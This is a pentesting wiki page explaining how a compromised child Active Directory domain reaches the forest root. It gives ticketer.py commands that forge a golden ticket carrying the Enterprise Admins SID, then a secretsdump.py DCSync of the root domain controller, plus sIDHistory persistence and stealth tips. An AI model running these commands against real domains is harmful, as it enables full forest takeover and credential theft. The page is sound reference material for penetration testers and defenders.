---
title: "Intra-forest trusts: crossing domains inside a forest"
description: "Moving from a child or sibling Active Directory domain to the forest root by injecting a privileged SID into a forged ticket, because intra-forest trusts do not apply SID filtering and the forest, not the domain, is the security boundary."
keywords:
  - intra-forest trust
  - SID history
  - extra SIDs
  - Enterprise Admins
  - forest root
---

# Intra-forest trusts

The security boundary in Active Directory is the **forest**, not the domain. Every domain in a forest trusts the others through automatic, bidirectional, transitive trusts, and those trusts do **not** apply SID filtering. So control of any single domain is control of the whole forest: a ticket forged in a child domain can claim membership in a forest-root group, and the root honours it.

## Why one domain owns the forest

- A Kerberos ticket carries the holder's SIDs in its PAC, including an **`extraSids`** field (the mechanism behind SID history) for SIDs from other domains.
- Intra-forest trusts pass these SIDs through unfiltered, because within a forest they are assumed legitimate.
- The **Enterprise Admins** group (RID 519, in the forest root) and the root domain's **Domain Admins** are forest-wide. A child-domain compromise that can forge tickets can therefore add those SIDs and act as a forest administrator.

## The technique

With the child domain fully compromised (its `krbtgt` key, from [DCSync](../authentication/credentials/ntds-and-dcsync.md)), forge a golden ticket that carries the Enterprise Admins SID in `extraSids`:

```bash
# Child domain krbtgt + child domain SID, plus the forest-root Enterprise Admins SID
ticketer.py -nthash <child-krbtgt-hash> -domain-sid <CHILD-domain-SID> \
  -domain child.example.local \
  -extra-sid <ROOT-domain-SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass -just-dc root-dc.example.local   # DCSync the forest root
```

The forged ticket is a child-domain TGT, but the `-519` SID in `extraSids` makes the forest root treat the holder as an Enterprise Admin, so you can immediately DCSync or act against the root domain.

## SID history as persistence

The same `extraSids`/SID-history idea persists when written to an account's **`sIDHistory`** attribute: an account carrying a privileged SID in `sIDHistory` keeps that access across logons without group membership that stands out. Writing `sIDHistory` normally requires DC-level access (or `DsAddSidHistory`), so it is a post-compromise persistence move rather than an escalation.

## Exploitation notes

- This is why "own one domain, own the forest": a single child `krbtgt` plus the root SID reaches Enterprise Admin, so domains are not a containment boundary against a forest-wide adversary.
- Needs the child domain's `krbtgt` key and the **forest-root domain SID** (read during [trust enumeration](trust-enumeration.md)); the `-519` RID targets Enterprise Admins.
- A diamond/sapphire variant (modifying a real ticket) is stealthier than a from-scratch golden ticket where PAC anomalies are monitored (see [forged tickets](../authentication/kerberos/forged-tickets.md)).

## Tools

- **Impacket** (`ticketer.py -extra-sid`, `secretsdump.py`, `raiseChild.py` which automates the whole child-to-root path).
- **Mimikatz** (`kerberos::golden /sids:`): golden ticket with extra SIDs on Windows.

## References

- The Hacker Recipes: intra-forest trusts and SID history
- Microsoft: the forest as a security boundary, SID filtering
